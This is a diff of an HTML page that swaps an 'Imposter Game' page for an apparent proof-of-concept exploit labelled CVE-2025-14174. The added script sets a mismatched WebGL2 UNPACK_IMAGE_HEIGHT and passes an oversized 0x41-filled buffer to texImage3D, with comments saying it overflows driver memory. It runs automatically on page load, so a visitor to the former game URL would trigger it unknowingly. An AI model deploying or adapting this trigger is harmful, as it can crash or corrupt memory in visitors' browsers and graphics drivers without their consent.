@@ -2,14 +2,79 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Imposter Game | Custom Edition</title>
-    <script src="index.js"></script>
+    <title>Technical Analysis: Resource Mismatch Simulation</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
+        .status-box { border: 1px solid #444; padding: 15px; border-radius: 8px; background: #222; }
+        .critical { color: #ff4444; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <div id="game-container">
-        <h1>Imposter Game</h1>
-        <p>Status: Loading Graphics Engine...</p>
-        </div>
+
+    <h2>CVE-2025-14174: Graphics Pipeline Logic Research</h2>
+    <div class="status-box">
+        <p>Status: <span id="log">Initializing WebGL 2.0 Context...</span></p>
+    </div>
+
+    <script>
+        const logElement = document.getElementById('log');
+        
+        function runSimulation() {
+            // 1. Initialize WebGL 2.0 (Required for texImage3D)
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl2');
+
+            if (!gl) {
+                logElement.innerText = "Error: WebGL 2.0 not supported.";
+                return;
+            }
+
+            logElement.innerText = "Step 1: Setting Mismatched Memory Instruction...";
+
+            // 2. THE MISMATCHED INSTRUCTION
+            // Variable: GL_UNPACK_IMAGE_HEIGHT
+            // We tell the driver the image is only 10 pixels high.
+            const instructionHeight = 10;
+            gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, instructionHeight);
+
+            // 3. THE "POUR" DATA
+            // Creating a buffer that represents 100x100x100 dimensions.
+            // On a vulnerable system, this 'largeData' overflows the '10-pixel' bucket.
+            const width = 100;
+            const actualHeight = 100;
+            const depth = 100;
+            const dataSize = width * actualHeight * depth * 4; // RGBA
+            const largeData = new Uint8Array(dataSize).fill(0x41); // Simulation of payload
+
+            logElement.innerHTML = "Step 2: <span class='critical'>Triggering Texture Render Process...</span>";
+
+            // 4. THE TRIGGER
+            // Passing the 100-high data into the 10-high allocated space.
+            try {
+                const texture = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_3D, texture);
+
+                gl.texImage3D(
+                    gl.TEXTURE_3D,
+                    0,               // Level
+                    gl.RGBA8,        // Internal Format
+                    width,           // 100
+                    actualHeight,    // 100 (The Overflower)
+                    depth,           // 100
+                    0,               // Border
+                    gl.RGBA,         // Format
+                    gl.UNSIGNED_BYTE,// Type
+                    largeData        // The data that "scribbles" over memory
+                );
+                
+                logElement.innerText = "Simulation Complete. On patched systems, the driver safely rejects or truncates this call.";
+            } catch (e) {
+                logElement.innerText = "Simulation halted by browser safety engine: " + e.message;
+            }
+        }
+
+        // Run automatically on page load
+        window.onload = runSimulation;
+    </script>
 </body>
 </html>
